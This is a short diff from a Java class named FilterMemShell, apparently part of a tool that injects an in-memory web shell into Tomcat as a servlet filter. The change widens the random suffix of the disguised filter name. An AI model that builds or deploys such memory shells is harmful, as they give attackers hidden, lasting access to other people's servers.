@@ -51,7 +51,7 @@ public class FilterMemShell implements Filter {
     public String addFilter() throws Exception {
         ServletContext servletContext = this.request.getServletContext();
         Filter filter = this;
-        final String filterName = "F!lter"+System.nanoTime()%100000L;
+        final String filterName = "F!lter"+System.nanoTime()%100000000L;
 
         org.apache.catalina.core.StandardContext standardContext = null;
         String msg;
